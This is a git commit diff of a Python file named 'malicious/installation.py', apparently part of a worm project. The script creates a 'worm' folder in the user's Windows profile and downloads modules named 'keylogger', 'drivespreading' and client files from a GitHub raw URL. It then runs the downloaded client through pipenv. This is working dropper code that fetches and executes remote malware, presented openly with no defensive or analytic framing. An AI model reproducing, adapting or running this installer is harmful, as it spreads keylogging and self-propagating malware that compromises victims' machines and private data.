39a06b0080b9de56af01362b926841d5a65ceee7
EdanJ <109800775+EdanJacobson@users.noreply.github.com>
2023-12-10 09:31:13 -0800

    Update installation.py

--- malicious/installation.py
+++ malicious/installation.py
@@ -1,55 +1,54 @@
 try:
     import sys
     import subprocess
-    
+
     subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)
-    
+
     import os
     import requests
 except Exception as error:
     print(error)
 else:
-    
     def get_project_files():
         owner = "EdanJacobson"
         repo = "ProjectCode"
         branch = "main"
         paths = {"malicious": ["drivespreading", "keylogger", "maliciousConstants"],
                  "clnt": ["client", "constants", "methods", "protocol"]}
-    
+
         base_dir = os.path.join("C:/Users", os.getlogin(), "worm")
-    
+
         for path in paths.keys():
             dir_path = os.path.join(base_dir, path)
-    
+
             if not os.path.exists(dir_path):
                 os.makedirs(dir_path)
                 init_file_path = os.path.join(dir_path, "__init__.py")
                 with open(init_file_path, "x") as init_file:
                     pass  # An empty block, as we just want to create an empty file
-    
+
             for file in paths.get(path):
                 file_url = f"https://raw.githubusercontent.com/{owner}/{repo}/{branch}/{path}/{file}.py"
                 response = requests.get(file_url)
-    
+
                 if response.status_code == 200:
                     content = response.content
                     output_file = os.path.join(dir_path, f"{file}.py")
                     sys.path.append(output_file)
-    
+
                     with open(output_file, 'wb') as f:
                         f.write(content)
                 else:
                     print(f"Failed to download file. Status code: {response.status_code}")
-    
-    
-    
+
+
     def main():
         get_project_files()
         path_to_client = os.path.join("C:/", "Users", os.getlogin(), "worm", "clnt", "client.py")
         subprocess.run([sys.executable, "-m", "pip", "install", "pipenv"], check=True)
-        subprocess.run(['pipenv', 'run', 'python', "C:/Users/edanj/worm/clnt/client.py"], check=True)
-    
-    
+        subprocess.run(['pipenv', 'run', 'python', path_to_client], check=True)
+
+
     if __name__ == '__main__':
         main()
+
